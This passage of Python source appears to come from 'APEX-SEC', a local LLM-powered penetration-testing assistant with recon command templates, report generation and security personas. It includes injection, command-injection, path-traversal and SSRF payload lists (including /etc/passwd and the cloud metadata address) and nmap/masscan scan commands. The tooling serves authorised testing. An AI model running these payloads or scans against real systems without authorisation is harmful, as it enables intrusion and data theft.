            "Test IDOR via numeric ID enumeration",
            "Test IDOR via UUID substitution",
            "Test mass assignment (send extra fields)",
            "Test broken object-level authorization (BOLA)",
        ]

    @staticmethod
    def rest_methodology() -> List[str]:
        return [
            "1. Enumerate endpoints via OpenAPI/Swagger docs",
            "2. Fuzz each endpoint with valid + invalid inputs",
            "3. Test rate limiting and throttling",
            "4. Test content-type confusion",
            "5. Test HTTP verb tampering (GET vs POST vs PUT)",
            "6. Test parameter pollution (HPP)",
            "7. Test SSRF via URL parameters",
            "8. Test injection in JSON/XML bodies",
            "9. Test CORS misconfiguration (Origin reflection)",
            "10. Test error handling information disclosure",
        ]

    @staticmethod
    def graphql_methodology() -> List[str]:
        return [
            "1. Introspection query (__schema) if enabled",
            "2. Field suggestion errors leak schema",
            "3. Query batching for rate limit bypass",
            "4. Nested query DoS (deep recursion)",
            "5. Alias-based batching for brute force",
            "6. IDOR via node(id:) queries",
            "7. Mutation abuse (privilege escalation)",
            "8. GraphQL SSRF via URL fields",
            "9. Subscription abuse",
            "10. Persisted query bypass",
        ]

    @staticmethod
    def generate_curl(method: str, url: str,
                      headers: Optional[Dict[str, str]] = None,
                      data: Optional[str] = None) -> str:
        parts = [f"curl -X {method.upper()} '{url}'"]
        for k, v in (headers or {}).items():
            parts.append(f"  -H '{k}: {v}'")
        if data:
            parts.append(f"  -d '{data}'")
        return " \\\n".join(parts)

    @staticmethod
    def common_payloads() -> Dict[str, List[str]]:
        return {
            "sql_injection": [
                "'", "\"", "' OR '1'='1", "1' AND SLEEP(5)--",
            ],
            "nosql_injection": [
                '{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}',
            ],
            "command_injection": [
                "; id", "| id", "$(id)", "`id`",
            ],
            "path_traversal": [
                "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
            ],
            "ssrf_targets": [
                "http://127.0.0.1", "http://169.254.169.254",
                "http://[::1]", "file:///etc/passwd",
            ],
        }


# =========================================================================
# SECTION 11 - IOT / NETWORK RECON MODULE
# =========================================================================

class ReconHelper:
    """Generates reconnaissance commands for network and IoT assessment."""

    @staticmethod
    def network_discovery(subnet: str = "192.168.1.0/24") -> List[Dict[str, str]]:
        return [
            {"tool": "nmap-ping-sweep",
             "cmd": f"nmap -sn {subnet}",
             "purpose": "Host discovery"},
            {"tool": "arp-scan",
             "cmd": "arp-scan --localnet",
             "purpose": "Local ARP discovery"},
            {"tool": "netdiscover",
             "cmd": f"netdiscover -r {subnet}",
             "purpose": "Passive+active discovery"},
        ]

    @staticmethod
    def port_scanning(target: str = "192.168.1.1") -> List[Dict[str, str]]:
        return [
            {"tool": "nmap-fast",
             "cmd": f"nmap -T4 -F {target}",
             "purpose": "Fast top-100 scan"},
            {"tool": "nmap-full",
             "cmd": f"nmap -p- -T4 {target}",
             "purpose": "Full port scan"},
            {"tool": "nmap-service",
             "cmd": f"nmap -sV -sC -p- {target}",
             "purpose": "Service + script scan"},
            {"tool": "nmap-udp",
             "cmd": f"nmap -sU --top-ports 100 {target}",
             "purpose": "UDP top ports"},
            {"tool": "masscan",
             "cmd": f"masscan -p1-65535 {target} --rate=1000",
             "purpose": "High-speed scan"},
        ]

    @staticmethod
    def iot_specific(target: str = "192.168.1.1") -> List[Dict[str, str]]:
        return [
            {"tool": "mqtt-enum",
             "cmd": f"nmap -p1883,8883 --script mqtt-subscribe {target}",
             "purpose": "MQTT broker enumeration"},
            {"tool": "upnp-enum",
             "cmd": f"nmap -p1900 --script upnp-info {target}",
             "purpose": "UPnP discovery"},
            {"tool": "coap-enum",
             "cmd": f"nmap -sU -p5683 --script coap-resources {target}",
             "purpose": "CoAP discovery"},
            {"tool": "rtsp-enum",
             "cmd": f"nmap -p554 --script rtsp-url-brute {target}",
             "purpose": "RTSP camera enumeration"},
            {"tool": "modbus-enum",
             "cmd": f"nmap -p502 --script modbus-discover {target}",
             "purpose": "Modbus ICS probe"},
            {"tool": "telnet-check",
             "cmd": f"nmap -p23 --script telnet-ntlm-info {target}",
             "purpose": "Telnet info leak"},
        ]

    @staticmethod
    def web_recon(target_url: str = "http://target.tld") -> List[Dict[str, str]]:
        return [
            {"tool": "whatweb",
             "cmd": f"whatweb -a 3 {target_url}",
             "purpose": "Technology fingerprint"},
            {"tool": "gobuster-dirs",
             "cmd": f"gobuster dir -u {target_url} -w /usr/share/wordlists/dirb/common.txt",
             "purpose": "Directory bruteforce"},
            {"tool": "nikto",
             "cmd": f"nikto -h {target_url}",
             "purpose": "Web server scan"},
            {"tool": "nuclei",
             "cmd": f"nuclei -u {target_url} -severity critical,high",
             "purpose": "Template-based scan"},
            {"tool": "ffuf-params",
             "cmd": f"ffuf -u {target_url}/?FUZZ=1 -w params.txt",
             "purpose": "Parameter discovery"},
        ]


# =========================================================================
# SECTION 12 - EVIDENCE / FILE HANDLER
# =========================================================================

class EvidenceManager:
    """Handles uploaded screenshots and artifacts as engagement evidence."""

    @staticmethod
    def save_upload(uploaded_file: Any, session_id: str,
                    caption: str = "", linked_cve: str = "") -> Optional[EvidenceItem]:
        """Persist an uploaded file to disk and register in memory DB."""
        if uploaded_file is None:
            return None

        try:
            content = uploaded_file.getvalue()
            if not content:
                return None

            ext = Path(uploaded_file.name).suffix or ".bin"
            safe_name = _safe_filename(Path(uploaded_file.name).stem)[:60]
            fname = f"{_utcnow().replace(':', '-')}_{safe_name}{ext}"
            fpath = EVIDENCE_DIR / fname

            with open(fpath, "wb") as fh:
                fh.write(content)

            return EvidenceItem(
                evidence_id=str(uuid.uuid4()),
                filename=uploaded_file.name,
                filepath=str(fpath),
                mime_type=getattr(uploaded_file, "type", "application/octet-stream"),
                size_bytes=len(content),
                caption=caption,
                linked_cve=linked_cve,
            )
        except (IOError, OSError, AttributeError) as exc:
            logger.error("Evidence save failed: %s", exc)
            return None

    @staticmethod
    def is_image(mime_type: str) -> bool:
        return mime_type.startswith("image/")

    @staticmethod
    def read_bytes(filepath: str) -> Optional[bytes]:
        try:
            with open(filepath, "rb") as fh:
                return fh.read()
        except (IOError, OSError):
            return None


# =========================================================================
# END OF PART 2
# =========================================================================
# =========================================================================
# SECTION 13 - PERSONAS (Professional Security Roles)
# =========================================================================

PERSONAS: Dict[str, Dict[str, Any]] = {
    "apex-sec": {
        "label": "APEX-SEC (Default)",
        "icon": "🛡️",
        "prompt": (
            "You are APEX-SEC, an elite Principal Security Researcher and "
            "Master Penetration Tester with 15+ years of offensive and "
            "defensive experience. You have led red teams for Fortune 500 "
            "companies, discovered critical CVEs, and authored widely-used "
            "security tooling.\n\n"
            "Your approach:\n"
            "- Guide the user step-by-step, never dumping large scripts at once\n"
            "- Always confirm scope and authorization before suggesting actions\n"
            "- Analyze errors deeply (WAF, privesc, syntax, logic)\n"
            "- Provide copy-paste ready commands with clear explanations\n"
            "- Reference real CVEs, techniques (MITRE ATT&CK), and tools\n"
            "- Think adversarially and defensively simultaneously"
        ),
    },
    "red-team-lead": {
        "label": "Red Team Lead",
        "icon": "🔴",
        "prompt": (
            "You are a Red Team Lead conducting authorized adversary "
            "simulation. You specialize in:\n"
            "- Initial access (phishing, exposed services, supply chain)\n"
            "- Persistence, privilege escalation, lateral movement\n"
            "- C2 frameworks (Cobalt Strike, Sliver, Mythic)\n"
            "- OPSEC and detection evasion\n"
            "- MITRE ATT&CK mapping\n\n"
            "Always state authorization requirements. Focus on realistic "
            "TTPs that mirror actual threat actors."
        ),
    },
    "blue-team-analyst": {
        "label": "Blue Team Analyst",
        "icon": "🔵",
        "prompt": (
            "You are a Blue Team Analyst defending enterprise networks. "
            "Your focus:\n"
            "- Detection engineering (Sigma, YARA, Snort, Suricata)\n"
            "- SIEM queries (Splunk SPL, Elastic EQL, Sentinel KQL)\n"
            "- Incident response and forensics\n"
            "- Threat hunting hypotheses\n"
            "- Hardening and CIS benchmarks\n\n"
            "Translate attacker TTPs into detection opportunities."
        ),
    },
    "bug-bounty-hunter": {
        "label": "Bug Bounty Hunter",
        "icon": "🎯",
        "prompt": (
            "You are an elite Bug Bounty Hunter with $500K+ in valid "
            "submissions across HackerOne, Bugcrowd, and Intigriti. You "
            "specialize in:\n"
            "- Web: SQLi, XSS, SSRF, IDOR, RCE, race conditions, business logic\n"
            "- API: BOLA, BFLA, mass assignment, JWT flaws\n"
            "- Mobile: Android/iOS reverse engineering\n"
            "- GraphQL, OAuth/OIDC, SAML\n\n"
            "Prioritize impact and exploitability. Write reports that "
            "triagers approve quickly."
        ),
    },
    "exploit-dev": {
        "label": "Exploit Developer",
        "icon": "💣",
        "prompt": (
            "You are an Exploit Developer specializing in memory corruption "
            "and weaponization. Expertise:\n"
            "- Buffer overflows (stack, heap, integer)\n"
            "- ROP/JOP chains, ASLR/DEP bypass\n"
            "- Format string, UAF, type confusion\n"
            "- Windows/Linux kernel exploitation\n"
            "- Shellcode development (x86, x64, ARM)\n\n"
            "Provide PoC development guidance for AUTHORIZED lab use only. "
            "Emphasize modern mitigations and bypass techniques."
        ),
    },
    "cloud-security": {
        "label": "Cloud Security Architect",
        "icon": "☁️",
        "prompt": (
            "You are a Cloud Security Architect specializing in AWS, Azure, "
            "and GCP. Expertise:\n"
            "- IAM privilege escalation paths\n"
            "- SSRF to cloud metadata (IMDSv1/v2)\n"
            "- S3/Blob/GCS misconfigurations\n"
            "- Kubernetes (RBAC, pod escape, admission controllers)\n"
            "- Serverless (Lambda, Functions) exploitation\n\n"
            "Reference cloud-specific attack paths and detection."
        ),
    },
    "api-security": {
        "label": "API Security Specialist",
        "icon": "🔌",
        "prompt": (
            "You are an API Security Specialist focused on REST, GraphQL, "
            "gRPC, and WebSocket APIs. Expertise:\n"
            "- OWASP API Top 10 (BOLA, BFLA, mass assignment)\n"
            "- Authentication flaws (JWT, OAuth, API keys)\n"
            "- Rate limiting bypass, batching attacks\n"
            "- Schema introspection abuse\n"
            "- Injection in JSON/XML/protobuf bodies\n\n"
            "Provide testing methodology and ready-to-use curl commands."
        ),
    },
    "iot-security": {
        "label": "IoT / Hardware Hacker",
        "icon": "📡",
        "prompt": (
            "You are an IoT and hardware security researcher. Expertise:\n"
            "- Firmware extraction and analysis (binwalk, firmware-mod-kit)\n"
            "- UART/JTAG/SPI debugging\n"
            "- MQTT, CoAP, Zigbee, BLE protocols\n"
            "- RTSP cameras, Modbus ICS, UPnP\n"
            "- Hardware fault injection, side channels\n\n"
            "Provide practical lab-oriented hardware hacking guidance."
        ),
    },
    "malware-analyst": {
        "label": "Malware Analyst",
        "icon": "🦠",
        "prompt": (
            "You are a senior Malware Analyst with reverse engineering "
            "expertise. Skills:\n"
            "- Static analysis (IDA Pro, Ghidra, Binary Ninja)\n"
            "- Dynamic analysis (Cuckoo, ANY.RUN, Procmon)\n"
            "- Unpacking, deobfuscation, anti-analysis bypass\n"
            "- YARA rule authoring\n"
            "- C2 protocol reverse engineering\n\n"
            "Provide IOC extraction and detection guidance."
        ),
    },
    "social-engineer": {
        "label": "Social Engineer",
        "icon": "🎭",
        "prompt": (
            "You are an authorized Social Engineering specialist conducting "
            "red team phishing and pretexting. Expertise:\n"
            "- Phishing infrastructure (GoPhish, Evilginx2)\n"
            "- Pretext development\n"
            "- OSINT for target profiling\n"
            "- Physical SE scenarios\n"
            "- MFA fatigue, OAuth consent phishing\n\n"
            "Only advise for authorized engagements with signed scope."
        ),
    },
    "compliance-auditor": {
        "label": "Compliance Auditor",
        "icon": "📋",
        "prompt": (
            "You are a Compliance Auditor mapping findings to frameworks:\n"
            "- PCI-DSS, HIPAA, SOC2, ISO 27001, GDPR\n"
            "- NIST CSF, NIST 800-53\n"
            "- CIS Benchmarks\n\n"
            "Translate technical findings into business risk language. "
            "Provide remediation priorities and evidence requirements."
        ),
    },
    "custom": {
        "label": "Custom Persona",
        "icon": "✏️",
        "prompt": "Follow the user's custom instructions precisely.",
    },
}


def get_persona_label(key: str) -> str:
    """Return the display label for a persona key."""
    persona = PERSONAS.get(key, PERSONAS["apex-sec"])
    return f"{persona.get('icon', '🛡️')} {persona.get('label', key)}"


# =========================================================================
# SECTION 14 - PROMPT ENGINEERING (Advanced System Prompt Builder)
# =========================================================================

class PromptEngineer:
    """
    Builds advanced, context-aware system prompts for the LLM.

    Combines persona, engagement context, threat intel, and operational
    directives into a single high-signal system prompt.
    """

    @staticmethod
    def _format_threat_intel(cisa_items: List[Dict[str, Any]],
                             limit: int = 25) -> str:
        if not cisa_items:
            return ""
        lines = ["[LIVE CISA KEV INTELLIGENCE]"]
        for item in cisa_items[:limit]:
            cve = item.get("cveID", "N/A")
            name = item.get("vulnerabilityName", "Unknown")[:80]
            vendor = item.get("vendorProject", "")
            product = item.get("product", "")
            lines.append(f"- {cve}: {name} ({vendor} {product})".strip())
        return "\n".join(lines)

    @staticmethod
    def _format_engagement(target: TargetProfile) -> str:
        return (
            "[ENGAGEMENT CONTEXT]\n"
            f"- Target IP/Host: {target.ip_address or 'unspecified'}\n"
            f"- Hostname: {target.hostname or 'unspecified'}\n"
            f"- Operating System: {target.os_info or 'unspecified'}\n"
            f"- MAC Address: {target.mac_address or 'unspecified'}\n"
            f"- Environment: {target.environment or 'lab'}\n"
            f"- Organization: {target.organization or 'unspecified'}\n"
            f"- Scope Notes: {target.scope_notes or 'none'}"
        )

    @staticmethod
    def _format_operational_directives(allow_payload: bool) -> str:
        payload_rule = (
            "Payload generation is ENABLED. Provide concrete, tested payloads "
            "with clear authorization warnings. Always note that payloads are "
            "for authorized lab use only."
            if allow_payload else
            "Payload generation is DISABLED. Provide only conceptual and "
            "defensive guidance. Do not generate executable attack payloads."
        )

        return (
            "[OPERATIONAL DIRECTIVES]\n"
            "1. Interactive step-by-step methodology. Do NOT dump large "
            "   scripts at once. Guide the user through one stage at a time.\n"
            "2. Confirm scope and authorization before suggesting any active "
            "   testing technique.\n"
            "3. Provide copy-paste-ready commands with clear explanations.\n"
            "4. Analyze errors deeply (WAF blocks, privilege escalation, "
            "   syntax issues, logical flaws).\n"
            "5. Structure every response as:\n"
            "   a) Brief analysis of the current situation\n"
            "   b) Numbered step-by-step guidance\n"
            "   c) Concrete commands or code blocks\n"
            "   d) Next steps or verification method\n"
            "6. Reference real CVEs, MITRE ATT&CK techniques, and industry "
            "   tools when relevant.\n"
            "7. If the user reports a bug/finding, offer to help draft a "
            "   professional vulnerability report.\n"
            f"8. {payload_rule}\n"
            "9. Never fabricate CVE IDs, tool names, or command outputs.\n"
            "10. Prioritize safety: flag destructive techniques clearly."
        )

    @staticmethod
    def _format_report_template() -> str:
        return (
            "[VULNERABILITY REPORT TEMPLATE]\n"
            "When the user reports a discovered bug, structure the finding as:\n"
            "- Title (concise, descriptive)\n"
            "- Severity (CVSS v3.1 score + vector)\n"
            "- Affected Component (URL/endpoint/parameter)\n"
            "- Description (what the vulnerability is)\n"
            "- Steps to Reproduce (numbered, precise)\n"
            "- Proof of Concept (request/response, screenshot references)\n"
            "- Impact (business + technical consequences)\n"
            "- Remediation (specific, actionable fixes)\n"
            "- References (CVEs, OWASP, vendor advisories)"
        )

    @classmethod
    def build(cls, persona_key: str, target: TargetProfile,
              allow_payload: bool, custom_prompt: str = "",
              cisa_items: Optional[List[Dict[str, Any]]] = None) -> str:
        persona = PERSONAS.get(persona_key, PERSONAS["apex-sec"])
        persona_text = persona["prompt"]
        if persona_key == "custom" and custom_prompt.strip():
            persona_text = custom_prompt.strip()

        sections = [
            persona_text,
            cls._format_engagement(target),
            cls._format_operational_directives(allow_payload),
            cls._format_report_template(),
        ]

        intel = cls._format_threat_intel(cisa_items or [])
        if intel:
            sections.append(intel)

        sections.append(
            "[CLOSING]\n"
            "Maintain a professional, analytical, and structured workflow. "
            "Always favor clarity over cleverness. Confirm before acting."
        )

        return "\n\n".join(sections)


# =========================================================================
# SECTION 15 - LLM BRIDGE (Ollama)
# =========================================================================

class LLMBridge:
    """
    Manages the connection to the local Ollama LLM.

    Handles model selection, prompt injection, retries, and graceful
    degradation when the model is unavailable.
    """

    def __init__(self, config: ConfigManager) -> None:
        self.config = config
        self._instance: Optional[Any] = None
        self._signature: str = ""

    def _current_signature(self, system_prompt: str) -> str:
        """Compute a signature so we know when to rebuild the LLM."""
        return hashlib.md5(
            (
                str(self.config.get("model")) +
                str(self.config.get("temperature")) +
                str(self.config.get("top_p")) +
                str(self.config.get("num_predict")) +
                system_prompt
            ).encode("utf-8")
        ).hexdigest()

    def get_instance(self, system_prompt: str) -> Optional[Any]:
        if Ollama is None:
            logger.error("LangChain Ollama not available")
            return None

        signature = self._current_signature(system_prompt)
        if self._instance is not None and self._signature == signature:
            return self._instance

        try:
            self._instance = Ollama(
                model=str(self.config.get("model")),
                system=system_prompt,
                temperature=float(self.config.get("temperature")),
                top_p=float(self.config.get("top_p")),
                num_predict=int(self.config.get("num_predict")),
            )
            self._signature = signature
            logger.info("LLM instance created: %s", self.config.get("model"))
            return self._instance
        except Exception as exc:
            logger.error("LLM init failed: %s", exc)
            self._instance = None
            self._signature = ""
            return None

    def invalidate(self) -> None:
        """Force rebuild on next call."""
        self._instance = None
        self._signature = ""

    def generate(self, prompt: str, system_prompt: str) -> Tuple[bool, str]:
        """Invoke the LLM. Returns (success, text_or_error)."""
        llm = self.get_instance(system_prompt)
        if llm is None:
            return False, (
                "AI engine unavailable. Ensure Ollama is running:\n"
                "  1. ollama serve\n"
                "  2. ollama pull llama3\n"
                "  3. Reload this page"
            )
        try:
            response = llm.invoke(prompt)
            if not response:
                return False, "Empty response from model."
            return True, str(response)
        except Exception as exc:
            logger.error("LLM invoke failed: %s", exc)
            return False, f"Generation error: {exc}"

    @staticmethod
    def list_local_models() -> List[str]:
        """Query Ollama's local model list (best effort)."""
        try:
            res = requests.get("http://localhost:11434/api/tags", timeout=5)
            if res.status_code == 200:
                data = res.json()
                return [m.get("name", "") for m in data.get("models", [])]
        except requests.exceptions.RequestException:
            pass
        return []


# =========================================================================
# SECTION 16 - REPORT GENERATOR (Professional Vulnerability Reports)
# =========================================================================

class ReportGenerator:
    """
    Generates professional vulnerability reports from tracked findings
    and chat history. Produces Markdown, JSON, and HTML outputs.
    """

    SEVERITY_ORDER = ["Critical", "High", "Medium", "Low", "Info"]
    SEVERITY_COLORS = {
        "Critical": "#8B0000",
        "High": "#DC143C",
        "Medium": "#FF8C00",
        "Low": "#FFD700",
        "Info": "#4682B4",
    }
    SEVERITY_SCORE = {
        "Critical": 9.5,
        "High": 7.5,
        "Medium": 5.0,
        "Low": 2.5,
        "Info": 0.5,
    }

    @classmethod
    def _severity_chart(cls, summary: Dict[str, int]) -> str:
        """Return an ASCII chart of severity counts."""
        if not summary:
            return "No findings."
        lines = []
        max_count = max(summary.values()) if summary else 1
        for sev in cls.SEVERITY_ORDER:
            count = summary.get(sev, 0)
            if count == 0:
                continue
            bar = "█" * int((count / max_count) * 40)
            lines.append(f"  {sev:<10} | {bar} {count}")
        return "\n".join(lines)

    @classmethod
    def _risk_rating(cls, summary: Dict[str, int]) -> str:
        critical = summary.get("Critical", 0)
        high = summary.get("High", 0)
        medium = summary.get("Medium", 0)
        if critical > 0:
            return "CRITICAL - Immediate action required"
        if high > 0:
            return "HIGH - Remediation required urgently"
        if medium > 0:
            return "MEDIUM - Schedule remediation"
        return "LOW - Monitor and address as time permits"

    @classmethod
    def generate_markdown(cls, tracker: VulnerabilityTracker,
                          evidence: List[Dict[str, Any]],
                          session_id: str,
                          author: str = "Security Researcher",
                          org: str = "Independent") -> str:
        now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
        summary = tracker.summary()
        target = tracker.target

        parts = [
            f"# Security Assessment Report",
            "",
            f"**Report ID:** APEX-{session_id[:8].upper()}",
            f"**Date:** {now}",
            f"**Author:** {author}",
            f"**Organization:** {org}",
            f"**Tool:** {APP_NAME} v{APP_VERSION}",
            "",
            "---",
            "",
            "## 1. Executive Summary",
            "",
            f"**Overall Risk Rating:** {cls._risk_rating(summary)}",
            "",
            f"**Total Findings:** {len(tracker.knowledge_base)}",
            "",
            "### Severity Breakdown",
            "",
            "```",
            cls._severity_chart(summary),
            "```",
            "",
            "---",
            "",
            "## 2. Engagement Scope",
            "",
            f"| Field | Value |",
            f"|-------|-------|",
            f"| Target IP | {target.ip_address or 'N/A'} |",
            f"| Hostname | {target.hostname or 'N/A'} |",
            f"| Operating System | {target.os_info or 'N/A'} |",
            f"| MAC Address | {target.mac_address or 'N/A'} |",
            f"| Environment | {target.environment or 'lab'} |",
            f"| Organization | {target.organization or 'N/A'} |",
            f"| Scope Notes | {target.scope_notes or 'None'} |",
            "",
            "---",
            "",
            "## 3. Findings",
            "",
        ]

        if not tracker.knowledge_base:
            parts.append("_No vulnerabilities recorded during this engagement._\n")
        else:
            for idx, v in enumerate(tracker.knowledge_base, 1):
                parts.append(f"### Finding {idx}: {v.title or v.cve_id}")
                parts.append("")
                parts.append(f"| Attribute | Value |")
                parts.append(f"|-----------|-------|")
                parts.append(f"| CVE / ID | {v.cve_id} |")
                parts.append(f"| Severity | {v.severity} |")
                if v.cvss_score:
                    parts.append(f"| CVSS Score | {v.cvss_score} |")
                if v.cvss_vector:
                    parts.append(f"| CVSS Vector | `{v.cvss_vector}` |")
                parts.append("")

                if v.description:
                    parts.append(f"**Description:**")
                    parts.append("")
                    parts.append(v.description)
                    parts.append("")

                if v.impact:
                    parts.append(f"**Impact:**")
                    parts.append("")
                    parts.append(v.impact)
                    parts.append("")

                if v.steps_to_reproduce:
                    parts.append("**Steps to Reproduce:**")
                    parts.append("")
                    for i, step in enumerate(v.steps_to_reproduce, 1):
                        parts.append(f"{i}. {step}")
                    parts.append("")

                if v.tools_used:
                    parts.append(f"**Tools Used:** {', '.join(v.tools_used)}")
                    parts.append("")

                if v.mitigation:
                    parts.append("**Remediation:**")
                    parts.append("")
                    parts.append(v.mitigation)
                    parts.append("")

                linked = [e for e in evidence if e.get("linked_cve") == v.cve_id]
                if linked:
                    parts.append(f"**Evidence:** {len(linked)} file(s) attached")
                    parts.append("")

                if v.references:
                    parts.append("**References:**")
                    parts.append("")
                    for ref in v.references:
                        parts.append(f"- {ref}")
                    parts.append("")

                parts.append("---")
                parts.append("")

        parts.extend([
            "## 4. Methodology",
            "",
            "This assessment was conducted using APEX-SEC, an AI-powered ",
            "security operations framework. Testing followed industry-standard ",
            "methodologies including OWASP Testing Guide, PTES, and MITRE ATT&CK.",
            "",
            "---",
            "",
            "## 5. Legal Disclaimer",
            "",
            "This report was generated for authorized security testing purposes ",
            "only. All findings must be remediated in accordance with the ",
            "organization's risk management policies. The authors assume no ",
            "liability for misuse or misinterpretation of this report.",
            "",
            "---",
            "",
            f"_Generated by {APP_NAME} v{APP_VERSION} on {now}_",
        ])

        return "\n".join(parts)

    @classmethod
    def generate_html(cls, markdown_text: str, title: str = "Security Report") -> str:
        """Wrap markdown report in a styled HTML shell."""
        safe_md = (
            markdown_text
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
        )
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>{title}</title>
<style>
body {{
    font-family: 'Segoe UI', Roboto, sans-serif;
    max-width: 900px;
    margin: 40px auto;
    padding: 20px;
    background: #0d1117;
    color: #c9d1d9;
    line-height: 1.6;
}}
h1, h2, h3 {{ color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 8px; }}
pre {{
    background: #161b22; padding: 15px; border-radius: 6px;
    overflow-x: auto; border: 1px solid #30363d;
}}
code {{ color: #79c0ff; }}
table {{ border-collapse: collapse; width: 100%; margin: 15px 0; }}
th, td {{ border: 1px solid #30363d; padding: 8px; text-align: left; }}
th {{ background: #161b22; color: #58a6ff; }}
hr {{ border: none; border-top: 1px solid #30363d; margin: 30px 0; }}
</style>
</head>
<body>
<pre>{safe_md}</pre>
</body>
</html>"""

    @classmethod
    def generate_json(cls, tracker: VulnerabilityTracker,
                      evidence: List[Dict[str, Any]],
                      session_id: str) -> str:
        payload = {
            "report_id": f"APEX-{session_id[:8].upper()}",
            "generated_at": _utcnow(),
            "tool": f"{APP_NAME} v{APP_VERSION}",
            "target": asdict(tracker.target),
            "summary": tracker.summary(),
            "risk_rating": cls._risk_rating(tracker.summary()),
            "vulnerabilities": [asdict(v) for v in tracker.knowledge_base],
            "evidence": evidence,
        }
        return json.dumps(payload, indent=4, ensure_ascii=False)


# =========================================================================
# SECTION 17 - CHAT ORCHESTRATOR
# =========================================================================

class ChatOrchestrator:
    """
    Coordinates a single chat turn: context building, LLM invocation,
    memory persistence, and error recovery.
    """

    def __init__(self, memory: MemoryManager, config: ConfigManager,
                 bridge: LLMBridge) -> None:
        self.memory = memory
        self.config = config
        self.bridge = bridge

    def process(self, session_id: str, user_input: str,
                tracker: VulnerabilityTracker) -> Tuple[bool, str]:
        # Persist user message
        self.memory.add_message(session_id, "user", user_input)

        # Build prompt
        system_prompt = PromptEngineer.build(
            persona_key=str(self.config.get("persona")),
            target=tracker.target,
            allow_payload=bool(self.config.get("allow_payload_gen")),
            custom_prompt=str(self.config.get("custom_prompt", "")),
            cisa_items=load_threat_intel(),
        )

        context = self.memory.build_context(
            session_id,
            last_n=int(self.config.get("context_messages", 30)),
        )

        # Invoke LLM
        ok, response = self.bridge.generate(context, system_prompt)

        # Persist assistant message (even on error)
        if ok:
            self.memory.add_message(session_id, "assistant", response)
        else:
            self.memory.add_message(
                session_id, "assistant",
                f"[System] {response}",
                meta={"error": True},
            )

        return ok, response


# =========================================================================
# SECTION 18 - SESSION STATE BOOTSTRAP
# =========================================================================

def _init_session_state() -> None:
    """Initialize all Streamlit session state on first run."""
    if "config_mgr" not in st.session_state:
        st.session_state.config_mgr = ConfigManager()

    if "memory" not in st.session_state:
        st.session_state.memory = MemoryManager()

    if "v_tracker" not in st.session_state:
        st.session_state.v_tracker = VulnerabilityTracker()

    if "llm_bridge" not in st.session_state:
        st.session_state.llm_bridge = LLMBridge(st.session_state.config_mgr)

    if "orchestrator" not in st.session_state:
        st.session_state.orchestrator = ChatOrchestrator(
            st.session_state.memory,
            st.session_state.config_mgr,
            st.session_state.llm_bridge,
        )

    if "session_id" not in st.session_state:
        st.session_state.session_id = st.session_state.memory.create_session(
            title="Engagement Session"
        )

    if "pending_evidence" not in st.session_state:
        st.session_state.pending_evidence = []


# =========================================================================
# END OF PART 3
# =========================================================================
# =========================================================================
# SECTION 19 - STREAMLIT PAGE CONFIGURATION
# =========================================================================

st.set_page_config(
    page_title=f"{APP_NAME} | {APP_TAGLINE}",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded",
)


# =========================================================================
# SECTION 20 - GLOBAL THEME (Professional Dark UI)
# =========================================================================

def _apply_theme() -> None:
    """Inject custom CSS for a professional security-operations look."""
    st.markdown("""
    <style>
    :root {
        --bg-primary: #0d1117;
        --bg-secondary: #161b22;
        --bg-tertiary: #21262d;
        --border: #30363d;
        --text-primary: #c9d1d9;
        --text-secondary: #8b949e;
        --accent-blue: #58a6ff;
        --accent-green: #238636;
        --accent-red: #da3633;
        --accent-orange: #d29922;
    }
    .stApp { background-color: var(--bg-primary); color: var(--text-primary); }
    section[data-testid="stSidebar"] {
        background-color: var(--bg-secondary);
        border-right: 1px solid var(--border);
    }
    .stButton>button {
        background-color: var(--accent-red);
        color: #ffffff;
        font-weight: 600;
        border-radius: 6px;
        border: 1px solid #f85149;
        padding: 8px 18px;
        width: 100%;
        transition: all 0.15s ease;
    }
    .stButton>button:hover {
        background-color: #b62324;
        border-color: #b62324;
        transform: translateY(-1px);
    }
    .stDownloadButton>button {
        background-color: var(--accent-green);
        color: #ffffff;
        font-weight: 600;
        border-radius: 6px;
        border: 1px solid #2ea043;
        padding: 8px 18px;
        width: 100%;
    }
    .stDownloadButton>button:hover { background-color: #2ea043; }
    .stTextInput>div>div>input,
    .stTextArea>div>textarea,
    .stSelectbox>div>div>div {
        background-color: var(--bg-tertiary) !important;
        color: var(--accent-blue) !important;
        border: 1px solid var(--border) !important;
    }
    .stTabs [data-baseweb="tab-list"] {
        gap: 4px;
        background-color: var(--bg-secondary);
        padding: 6px;
        border-radius: 8px;
        border: 1px solid var(--border);
    }
    .stTabs [data-baseweb="tab"] {
        background-color: transparent;
        color: var(--text-secondary);
        border-radius: 6px;
        padding: 8px 16px;
        font-weight: 600;
    }
    .stTabs [aria-selected="true"] {
        background-color: var(--bg-tertiary) !important;
        color: var(--accent-blue) !important;
    }
    .stCodeBlock { background-color: var(--bg-tertiary) !important; }
    code { color: #79c0ff !important; }
    h1, h2, h3 { color: var(--accent-blue); }
    .apex-header {
        padding: 16px 24px;
        background: linear-gradient(135deg, #161b22 0%, #0d1117 100%);
        border: 1px solid var(--border);
        border-radius: 10px;
        margin-bottom: 20px;
    }
    .apex-header h1 { margin: 0; font-size: 1.8rem; }
    .apex-header p { margin: 4px 0 0 0; color: var(--text-secondary); }
    .severity-critical { color: #ff6b6b; font-weight: 700; }
    .severity-high { color: #ff8c42; font-weight: 700; }
    .severity-medium { color: #ffd166; font-weight: 700; }
    .severity-low { color: #8ecae6; font-weight: 700; }
    .severity-info { color: #a0a0a0; font-weight: 700; }
    .evidence-card {
        padding: 10px;
        border: 1px solid var(--border);
        border-radius: 8px;
        background-color: var(--bg-secondary);
        margin-bottom: 8px;
    }
    </style>
    """, unsafe_allow_html=True)


_apply_theme()


# =========================================================================
# SECTION 21 - HEADER
# =========================================================================

def _render_header() -> None:
    st.markdown(f"""
    <div class="apex-header">
        <h1>🛡️ {APP_NAME} <span style="font-size:0.6rem;color:#8b949e;">v{APP_VERSION}</span></h1>
        <p>{APP_TAGLINE} — Powered by local Ollama | 100% On-Premises</p>
    </div>
    """, unsafe_allow_html=True)


_render_header()

# Bootstrap session state (from Part 3)
_init_session_state()

# Convenient references
